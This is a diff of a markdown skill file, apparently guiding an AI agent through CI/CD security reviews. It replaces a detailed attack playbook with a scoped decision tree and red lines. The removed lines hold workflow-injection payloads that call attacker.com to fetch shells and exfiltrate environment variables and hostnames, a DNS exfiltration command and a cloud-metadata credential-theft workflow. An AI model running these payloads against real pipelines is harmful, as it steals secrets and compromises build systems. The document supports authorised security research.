@@ -1,393 +1,74 @@
 ---
 name: cicd-security
-description: CI/CD pipeline security hunting — GitHub Actions workflow injection, secret exfiltration, self-hosted runner poisoning, dependency confusion, OIDC token theft, and supply chain attacks. Covers sisakulint scanning, manual workflow analysis, and chaining CI/CD bugs into critical findings. Use when a target has public repos, GitHub Actions, CircleCI, Jenkins, or GitLab CI.
+description: Decision skill for explicitly scoped CI/CD and supply-chain trust-boundary reviews. Selects the next evidence-producing branch; deterministic tools and knowledge cards provide execution detail.
 ---
 
-# CI/CD SECURITY — Pipeline Attack Surface
+# CI/CD Security Decision Skill
+
+This is a commander, not a scanner manual. Choose the next branch from the
+observed repository, trigger, permission, runner, artifact, and deployment
+context. Keep concrete probe shapes and tool syntax in the model or on-demand
+knowledge references.
 
 ## Direct Execution Contract
 
-- Entry: Invoke only when a public repository or CI/CD workflow is explicitly in scope; require an owner/repository or workflow URL, the allowed repository scope, and a bounded evidence output location.
-- Evidence: Before a candidate advances, retain the exact workflow path and revision, trigger and untrusted input, relevant permission or secret context, and a reproducible execution or static data-flow trace to target impact; scanner output alone is a lead.
-- Stop: Stop when the repository or workflow is out of scope, unavailable, or has no target-controlled impact path; hand reproducible candidates to triage-validation and stop after the declared repository or scan budget.
-
-> CI/CD pipelines are high-value targets — a single workflow injection can give you code execution on the build server, read ALL org secrets, and push backdoored releases to production.
-
----
-
-## 0. QUICK KILL CHECKLIST
-
-```
-[ ] Run cicd_scanner.sh <owner/repo> — catch low-hanging workflow lint issues
-[ ] Check for script injection: ${{ github.event.*.body/title/name }}
-[ ] Find secrets referenced in env: — test if they leak in logs
-[ ] Check pull_request_target with checkout of untrusted code
-[ ] Look for self-hosted runners on public repos
-[ ] Search for OIDC token requests without audience restriction
-[ ] Check for unpinned actions (uses: owner/action@main)
-[ ] Look for workflow_dispatch with no input validation
-[ ] Find artifact downloads without integrity checks
-[ ] Search for GITHUB_TOKEN with write permission used insecurely
-```
-
----
-
-## 1. TOOL — cicd_scanner.sh
-
-```bash
-# Single repo
-bash tools/cicd_scanner.sh owner/repo
-
-# Org-wide (up to 30 repos)
-bash tools/cicd_scanner.sh "org:orgname" --limit 50 --parallel 5
-
-# Scan with recursive reusable workflow analysis
-bash tools/cicd_scanner.sh owner/repo --recursive --depth 5
-
-# Custom output
-bash tools/cicd_scanner.sh owner/repo --output-dir ./findings/target/cicd
-```
-
-**Output:** `findings/<target>/cicd/scan_results.txt` + `summary.txt`
-
-**What sisakulint finds:**
-- Script injection via untrusted context
-- Unpinned actions (tag instead of SHA)
-- `pull_request_target` misuse
-- Dangerous patterns (`eval`, `curl | bash`, etc.)
-- Exposed secret names in `run:` blocks
-
----
-
-## 2. WORKFLOW INJECTION (Critical — Most Common Paid Bug)
-
-### What It Is
-GitHub Actions exposes PR/issue data as context variables. If injected into a `run:` block without sanitization, an attacker controls shell code.
-
-### Vulnerable Pattern
-```yaml
-# VULNERABLE — attacker controls pr.title
-- name: Print PR title
-  run: echo "Title: ${{ github.event.pull_request.title }}"
-  # Attacker PR title: "; curl attacker.com/shell.sh | bash #"
-```
-
-### Safe Pattern
-```yaml
-# SAFE — pass through env var, never interpolate directly
-- name: Print PR title
-  env:
-    PR_TITLE: ${{ github.event.pull_request.title }}
-  run: echo "Title: $PR_TITLE"
-```
-
-### Injectable Contexts (always check these)
-```
-github.event.pull_request.title
-github.event.pull_request.body
-github.event.pull_request.head.ref        ← branch names
-github.event.issue.title
-github.event.issue.body
-github.event.comment.body
-github.event.review.body
-github.event.review_comment.body
-github.event.discussion.title
-github.event.discussion.body
-github.head_ref                            ← alias for branch name
-github.event.inputs.*                      ← workflow_dispatch inputs
-```
-
-### PoC Payload
-```
-# PR title / issue title payload:
-"; wget -q -O- attacker.com/$(cat /etc/hostname | base64) #
-```
-
-### Detection Grep
-```bash
-# Find injectable patterns in .github/workflows/
-grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
-grep -rn '\${{.*github\.head_ref' .github/workflows/
-grep -rn '\${{.*github\.event\.inputs' .github/workflows/
-```
-
----
-
-## 3. pull_request_target MISUSE (Critical)
-
-### What It Is
-`pull_request_target` runs in the context of the BASE repo (has secrets) but can be tricked into checking out and running attacker code.
-
-### Vulnerable Pattern
-```yaml
-on: pull_request_target
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}  # ← attacker code!
-      - run: npm test  # runs attacker's package.json scripts
-```
-
-### Why It's Critical
-- `pull_request_target` has access to secrets
-- Checkout uses the PR's code
-- Any `run:` step executes attacker-controlled code with access to all org secrets
-
-### Detection
-```bash
-grep -rn 'pull_request_target' .github/workflows/
-# Then check if the same job does a checkout of the PR head
-grep -A 20 'pull_request_target' .github/workflows/*.yml | grep -E '(head\.sha|head_ref|checkout)'
-```
-
----
-
-## 4. SECRET EXFILTRATION
-
-### Secrets That Appear in Logs
-```bash
-# Search for secrets echoed in run: blocks
-grep -rn 'echo.*secrets\.' .github/workflows/
-grep -rn 'cat.*secrets\.' .github/workflows/
-grep -rn 'env.*secrets\.' .github/workflows/ | grep -v '^#'
-```
-
-### GITHUB_TOKEN Abuse
-The auto-generated `GITHUB_TOKEN` can be used to:
-- Push code to branches
-- Create releases
-- Read all private repo content
-- Approve PRs (if permissions allow)
-
-```yaml
-# Check for overly broad permissions
-permissions:
-  contents: write    # ← Can push/delete code
-  packages: write    # ← Can push malicious packages
-  pull-requests: write
-```
-
-### PoC — Exfil via DNS
-```bash
-# In an injected run: block
-curl "https://attacker.com/?d=$(printenv | base64 -w0)"
-# Or via DNS (more stealthy)
-nslookup "$(printenv SECRET | md5sum | cut -c1-20).attacker.com"
-```
-
----
-
-## 5. SELF-HOSTED RUNNER POISONING
-
-### Why It Matters
-Public repos with self-hosted runners allow ANY fork to queue jobs on internal machines.
-
-### Detection
-```bash
-# In workflow files
-grep -rn 'self-hosted' .github/workflows/
-# Combined with — does the repo accept PRs from forks?
-# Pull triggers that run on self-hosted
-grep -B5 'self-hosted' .github/workflows/*.yml | grep -E '(pull_request|push)'
-```
-
-### Exploit Path
-1. Fork public repo that uses self-hosted runners
-2. Open PR with malicious workflow step
-3. Job runs on internal self-hosted runner
-4. Access internal network, read instance metadata, exfil secrets
-
-### PoC Workflow Addition
-```yaml
-# Attacker adds to fork:
-jobs:
-  pwn:
-    runs-on: self-hosted
-    steps:
-      - name: Recon
-        run: |
-          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
-            | xargs -I{} curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}
-```
-
----
-
-## 6. OIDC TOKEN THEFT / CLOUD CREDENTIAL ABUSE
-
-### What It Is
-GitHub Actions can request short-lived cloud credentials via OIDC. Misconfigured trust policies allow any branch/repo to claim elevated AWS/GCP/Azure roles.
-
-### Detection
-```bash
-# Find OIDC usage
-grep -rn 'id-token.*write\|configure-aws-credentials\|google-github-actions\|azure/login' .github/workflows/
-```
-
-### Exploit: Overly Broad AWS Trust Policy
-```json
-{
-  "Condition": {
-    "StringEquals": {
-      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
-      "token.actions.githubusercontent.com:sub": "repo:org/*:*"
-    }
-  }
-}
-```
-→ Any branch in the org can assume this role.
-
-### What to Check
-```
-1. What role does the workflow assume? (aws:role: ARN in workflow or secrets)
-2. Is the trust policy scoped to a specific branch? (ref:refs/heads/main)
-3. Can you trigger this from a fork or feature branch?
-4. What permissions does the role have?
-```
-
----
-
-## 7. DEPENDENCY CONFUSION / SUPPLY CHAIN
-
-### Unpinned Actions
-```yaml
-# VULNERABLE — could be hijacked if maintainer's account is compromised
-uses: actions/checkout@v3
-
-# SAFE — pinned to a specific commit SHA
-uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
-```
-
-### Dependency Confusion Attack
-Dependency confusion 必须通过三段式证据门，不能由 public registry 404 单独成立：
-
-```text
-public registry miss
-+ target build actually depends on the package
-+ resolver/config can fall back to the public registry
-= dependency-confusion Candidate
-```
-
-1. 从 `package.json`、lockfile、requirements、构建日志、JS/source 或 SBOM 证明目标构建实际消费内部包。
-2. 记录 `.npmrc`、pip/Poetry/NuGet/Maven/Gradle 配置、scope/source priority 和 lock behavior，证明解析会回落公共 registry。
-3. public registry 404 只说明名称当前未注册；缺第 1 或第 2 项时保持 Lead/Informational。
-4. 在隔离 registry/fixture 中验证 re-resolution、版本优先级和构建消费，不用公开发布动作代替 resolver 证据。
-
-### Detection
-```bash
-# Find internal package names in config files
-grep -rn '"registry"' package.json .npmrc
-grep -rn 'index-url\|extra-index-url' requirements.txt pip.conf setup.py
-# 二次证据：lockfile / build log / SBOM / image layer
-grep -rn 'resolved\|integrity\|version' package-lock.json yarn.lock pnpm-lock.yaml
-grep -rn 'SPDX\|CycloneDX\|bom-ref\|purl' .
-# Public registry 404 remains a Lead until dependency + fallback are both proven
-```
-
-还应检查公共 Docker Hub/GHCR image layer 中的 package metadata，以及 SPDX/CycloneDX SBOM
-映射出的精确 package/version，再与 OSV/CVE 关联；这些证据能确认消费版本，但不能替代 public fallback。
-
----
-
-## 8. BUG CLASS TABLE
-
-| Bug | Trigger | Severity | CVSS Range |
-|-----|---------|----------|-----------|
-| Workflow injection via PR title | `${{ github.event.pull_request.title }}` in `run:` | Critical | 9.0–10.0 |
-| `pull_request_target` + checkout | Accepts PRs from forks | Critical | 9.0–10.0 |
-| Self-hosted runner on public repo | `runs-on: self-hosted` + public repo | High | 7.5–9.0 |
-| OIDC trust too broad | Any-branch/any-repo claim | High | 7.5–8.5 |
-| Secret in log | `echo ${{ secrets.X }}` | Medium | 5.5–7.0 |
-| Unpinned action | `@main` / `@v1` tag | Low–Medium | 3.0–5.5 |
-| Artifact poisoning | Unsigned artifact download + exec | Medium | 5.5–7.0 |
-| `GITHUB_TOKEN` write abuse | Push to protected branch | Medium | 5.5–7.0 |
-| Dependency confusion | Internal dependency + public fallback + public name available/missing | High | 7.5–9.0 |
-| `workflow_dispatch` injection | Unvalidated inputs in `run:` | Medium–High | 6.0–8.0 |
-
----
-
-## 9. CHAINING CI/CD BUGS
-
-### Chain A: IDOR → CI/CD Secret Read
-```
-1. IDOR on /api/repos/{id}/settings → read CI/CD config
-2. Config references internal secret names
-3. Workflow injection to exfil those secrets
-→ Impact: Full org secret exfiltration
-```
-
-### Chain B: XSS → GitHub Token Theft
-```
-1. Stored XSS on internal GitHub Enterprise
-2. JS payload reads document.cookie / localStorage for GITHUB_TOKEN
-3. Token used to trigger workflow with malicious inputs
-→ Impact: RCE on build infrastructure
-```
-
-### Chain C: Supply Chain → Production Push
-```
-1. Find unpinned action (e.g., uses: corp/internal-action@main)
-2. Fork or compromise corp/internal-action
-3. Merge malicious code
-4. Next CI run pulls the compromised action with full repo write access
-→ Impact: Code execution, backdoored releases
-```
-
----
-
-## 10. REPORT TEMPLATE
-
-```markdown
-## Summary
-GitHub Actions workflow in `<repo>` is vulnerable to **workflow injection** via the
-`github.event.pull_request.title` context variable, which is interpolated directly
-into a `run:` shell block. An attacker who opens a specially crafted PR can achieve
-arbitrary code execution on the build runner with full access to all repository secrets.
-
-## Steps to Reproduce
-1. Fork `<repo>`
-2. Open a PR with the following title:
-   `"; curl -s attacker.com/$(cat /etc/hostname | base64 -w0 | head -c 40) #`
-3. The CI workflow `.github/workflows/<name>.yml` runs and executes the injected command.
-4. Observe DNS/HTTP callback to attacker.com with hostname (or secret payload).
-
-## Impact
-- RCE on build runner
-- Read of all `${{ secrets.* }}` available to the workflow
-- Ability to push malicious code to repository or publish backdoored packages
-- Pivot to internal network if runner is self-hosted
-
-## Remediation
-Replace direct context interpolation with environment variable assignment:
-env:
-  PR_TITLE: ${{ github.event.pull_request.title }}
-run: echo "$PR_TITLE"
-
-## CVSS
-CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (Critical, 10.0)
-```
-
----
-
-## 11. TOOLS REFERENCE
-
-| Tool | Purpose | Install |
-|------|---------|---------|
-| `sisakulint` | Lint GitHub Actions workflows for security issues | `bash install_tools.sh` |
-| `trufflehog` | Find secrets leaked in git history / workflow logs | `bash install_tools.sh` |
-| `gitleaks` | Scan repos for hardcoded secrets | `bash install_tools.sh` |
-| `gh` CLI | Download workflow logs, list secrets, trigger runs | `brew install gh` |
-| `nuclei` | CI/CD-specific templates | `-tags cicd` |
-| `secrets_hunter.sh` | Wrapper for all three secret scanners | `bash tools/secrets_hunter.sh` |
-
-```bash
-# Download public workflow run logs (no auth needed)
-gh run list --repo owner/repo --limit 10
-gh run view <run-id> --log --repo owner/repo
-
-# List exposed secret names (names only — values never shown by API)
-gh secret list --repo owner/repo
-```
+- Entry: Use only when a public repository, workflow, package, artifact, or
+  deployment path is explicitly in scope. Require the repository/workflow
+  identity, permitted scope, and a bounded read-only or test-branch boundary.
+- Evidence: A candidate needs the exact revision and workflow path, trigger and
+  untrusted input, permission/secret context, data-flow edge, and a reproducible
+  execution or static trace to target impact. Scanner output is a lead only.
+- Stop: Stop on scope, revision, or ownership mismatch; on a missing impact
+  connector; or when the declared repository and execution budget is exhausted.
+  Hand reproducible candidates to `triage-validation`.
+
+## Decision Tree
+
+- No explicit CI/CD asset -> return to `web2-recon` for discovery; do not infer
+  a pipeline from branding or a package name.
+- Untrusted trigger or editable input is present -> compare the trigger's
+  privilege, checkout/ref, expression context, and downstream runner boundary.
+- A self-hosted runner, cache, or artifact crosses trust levels -> follow the
+  workspace, persistence, and consumer edge before considering execution impact.
+- Secrets or OIDC permissions are reachable -> verify subject/audience, branch,
+  environment, and release/deploy consumers; a permission flag alone is a lead.
+- Internal package or image identity is visible -> route to the dependency-
+  confusion branch only when the target build actually depends on the package,
+  the resolver/config can fall back to the public registry, and public
+  namespace state can be independently established.
+- A candidate has a concrete server, cloud, release, or package impact -> hand
+  the evidence to validation; otherwise keep it as a lead or informational note.
+
+## ROI Priorities
+
+1. Privileged triggers that accept contributor-controlled input.
+2. Self-hosted runners, shared caches, artifacts, and release/deploy jobs.
+3. OIDC or secret paths whose trust policy is broader than the workflow scope.
+4. Package, image, or action resolution with a proven private-to-public edge.
+5. Low-impact lint, pinning, or disclosure signals only after the high-value
+   trust edges are exhausted.
+
+## Phase Checkpoints
+
+- Before a branch: record the revision, owner, trigger, privilege, and expected
+  target-side effect.
+- After each bounded trace: if no new trust edge or impact evidence appears,
+  switch to the next ROI branch or stop; do not expand into broad repository
+  spraying.
+- Before handoff: preserve the smallest reproducible diff or static trace,
+  cleanup state, and the unresolved evidence question.
+
+## Evidence Gate and Handoff
+
+The minimum proof is `untrusted input -> workflow context -> runner/credential
+or artifact -> target-controlled impact`, with independent evidence for each
+edge. A workflow file, `id-token` permission, package 404, masked log value, or
+runner command alone does not pass. Use `cicd-trust-boundaries` for cross-layer
+signals and route confirmed impact to `triage-validation`.
+
+## Red Lines
+
+Do not execute unknown workflows, read real secrets, publish packages/images,
+alter production deployment, or reuse credentials outside the declared test
+boundary. The model chooses the hypothesis; existing deterministic tools only
+collect bounded evidence and write their normal artifacts.
